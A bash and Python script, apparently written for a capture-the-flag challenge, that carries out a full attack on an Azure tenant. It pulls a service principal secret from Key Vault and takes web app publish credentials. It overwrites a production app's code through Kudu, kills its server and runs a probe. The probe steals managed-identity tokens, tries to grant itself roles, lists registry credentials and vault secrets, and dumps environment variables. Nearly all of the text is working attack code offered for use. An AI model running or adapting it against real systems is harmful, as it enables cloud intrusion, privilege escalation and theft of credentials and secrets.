#!/usr/bin/env bash
set -uo pipefail

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get reporting-service credentials
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
echo "RS: $RS_CID"

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, time

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_ADMIN_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

RS_CID = os.environ.get("RS_CID", "")
RS_SEC = os.environ.get("RS_SEC", "")

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except Exception as e:
        return f"ERR:{e}"

def http_arm(url, tok, method="GET", data=None):
    h = {"Authorization": "Bearer " + tok}
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:800]
    except Exception as e:
        return 0, str(e)[:200]

RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
print(f"RS ARM len={len(RS_ARM)}")

# Get FRESH publish credentials via ARM
print("=== Get fresh Kudu creds ===")
s_pub, b_pub = http_arm(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", RS_ARM, method="POST")
print(f"publishxml: {s_pub}: {b_pub[:2000]}")

# Parse publishxml to get Kudu credentials
import re, xml.etree.ElementTree as ET
kudu_user = kudu_pass = ""
if s_pub == 200:
    try:
        root = ET.fromstring(b_pub)
        for profile in root.findall("publishProfile"):
            if profile.get("publishMethod") == "MSDeploy":
                kudu_user = profile.get("userName", "")
                kudu_pass = profile.get("userPWD", "")
                break
        if not kudu_user:
            # Try XML parsing alternative
            m = re.search(r'userName="([^"]+)"[^>]+userPWD="([^"]+)"', b_pub)
            if m:
                kudu_user, kudu_pass = m.group(1), m.group(2)
    except Exception as e:
        print(f"XML parse err: {e}")
        # Try regex
        m = re.search(r'userName="([^"]+)".*?userPWD="([^"]+)"', b_pub, re.S)
        if m:
            kudu_user, kudu_pass = m.group(1), m.group(2)

print(f"Kudu user={kudu_user} pass_len={len(kudu_pass)}")

if kudu_user and kudu_pass:
    kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
    KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"

    # Write app41 probe
    app41_code = '''#!/usr/bin/env python3
import os, json, urllib.request, urllib.parse, urllib.error

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi_tok(resource, cid=UAMI_CID):
    ep = os.environ.get("IDENTITY_ENDPOINT", "")
    hdr = os.environ.get("IDENTITY_HEADER", "")
    if not ep: return "ERR:NO_EP"
    try:
        url = f"{ep}?api-version=2019-08-01&resource={resource}&client_id={cid}"
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"X-IDENTITY-HEADER": hdr}), timeout=15)
        return json.loads(r.read()).get("access_token", "ERR:NO_TOK")
    except Exception as e: return f"ERR:{e}"

def http(url, tok, method="GET", data=None):
    h = {"Authorization": "Bearer " + tok}
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:800]
    except Exception as e: return 0, str(e)[:200]

def ex_tok(xchg, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": LEGACY_APPID,
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": xchg, "grant_type": "client_credentials", "scope": scope
            }).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except Exception as e: return f"ERR:{e}"

R = {}

# UAMI tokens
ARM = msi_tok("https://management.azure.com/")
VAULT = msi_tok("https://vault.azure.net/")
XCHG = msi_tok("api://AzureADTokenExchange")
STOR = msi_tok("https://storage.azure.com/")
R["arm_len"] = len(ARM) if not ARM.startswith("ERR") else ARM
R["vault_len"] = len(VAULT) if not VAULT.startswith("ERR") else VAULT
R["xchg_len"] = len(XCHG) if not XCHG.startswith("ERR") else XCHG
R["stor_len"] = len(STOR) if not STOR.startswith("ERR") else STOR

if not ARM.startswith("ERR"):
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", ARM)
    R["uami_roles_sub"] = f"{s}:{b[:1000]}"
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", ARM)
    R["rg_roles_atscope"] = f"{s}:{b[:2000]}"
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", ARM)
    R["all_resources"] = f"{s}:{b[:3000]}"
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", ARM, method="POST")
    R["storefront_cfg"] = f"{s}:{b[:800]}"
    import uuid; ra_id = str(uuid.uuid4())
    ra_body = {"properties": {"roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId": UAMI_OID,"principalType":"ServicePrincipal"}}
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
    R["ra_write_kvsec"] = f"{s}:{b[:500]}"
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
    R["ra_write_sub"] = f"{s}:{b[:500]}"
    s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, method="POST")
    R["acr_creds"] = f"{s}:{b[:500]}"

if not VAULT.startswith("ERR"):
    s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", VAULT)
    R["kvprod_list"] = f"{s}:{b[:500]}"
    s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", VAULT)
    R["kvsec_list"] = f"{s}:{b[:1000]}"
    for nm in ["flag","ctf-flag","tbl-flag","platform-flag","df26","challenge"]:
        sv,bv = http(f"https://{KV_SEC}.vault.azure.net/secrets/{nm}?api-version=7.4", VAULT)
        if sv == 200: R[f"FLAG_{nm}"] = bv

if not XCHG.startswith("ERR"):
    la_arm = ex_tok(XCHG, "https://management.azure.com/.default")
    R["la_arm_len"] = len(la_arm) if not la_arm.startswith("ERR") else la_arm
    if la_arm and not la_arm.startswith("ERR"):
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_arm)
        R["la_resources"] = f"{s}:{b[:3000]}"
        LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_arm)
        R["la_own_roles"] = f"{s}:{b[:500]}"
    la_vault = ex_tok(XCHG, "https://vault.azure.net/.default")
    R["la_vault_len"] = len(la_vault) if not la_vault.startswith("ERR") else la_vault
    if la_vault and not la_vault.startswith("ERR"):
        s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_vault)
        R["kvprod_la"] = f"{s}:{b[:1000]}"
        s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_vault)
        R["kvsec_la"] = f"{s}:{b[:1000]}"
        s,b = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", la_vault)
        R["kvprod_deleted_la"] = f"{s}:{b[:1000]}"

R["env_ep"] = os.environ.get("IDENTITY_ENDPOINT","NOT_SET")
R["env_dump"] = json.dumps({k:v[:200] for k,v in os.environ.items()})

print("=== APP42 RESULTS ===")
for k,v in sorted(R.items()):
    print(f"[{k}]: {str(v)[:800]}")
print("=== END ===")
'''

    # Deploy app41 code to reporting app
    put_req = urllib.request.Request(
        f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
        data=app41_code.encode(), method="PUT",
        headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
    )
    try:
        r = urllib.request.urlopen(put_req, timeout=30)
        print(f"VFS PUT: {r.status}")
    except urllib.error.HTTPError as e:
        print(f"VFS PUT: {e.code}: {e.read().decode()[:200]}")

    time.sleep(5)

    # Kill gunicorn and run directly
    for cmd in ["pkill -f gunicorn || true", "python3 /home/site/wwwroot/app.py 2>&1"]:
        run_req = urllib.request.Request(
            f"{KUDU_BASE}/api/command",
            data=json.dumps({"command": cmd, "dir": "/home/site/wwwroot"}).encode(),
            method="POST",
            headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/json"}
        )
        try:
            r = urllib.request.urlopen(run_req, timeout=90)
            result = json.loads(r.read())
            if "python3" in cmd:
                print("=== PROBE OUTPUT ===")
                print(result.get("Output", "")[:10000])
                if result.get("Error"):
                    print("STDERR:", result.get("Error", "")[:1000])
                print("ExitCode:", result.get("ExitCode", -1))
        except Exception as e:
            print(f"cmd err ({cmd[:20]}): {e}")
else:
    print("Could not get Kudu credentials!")

PYEOF
echo "DONE"
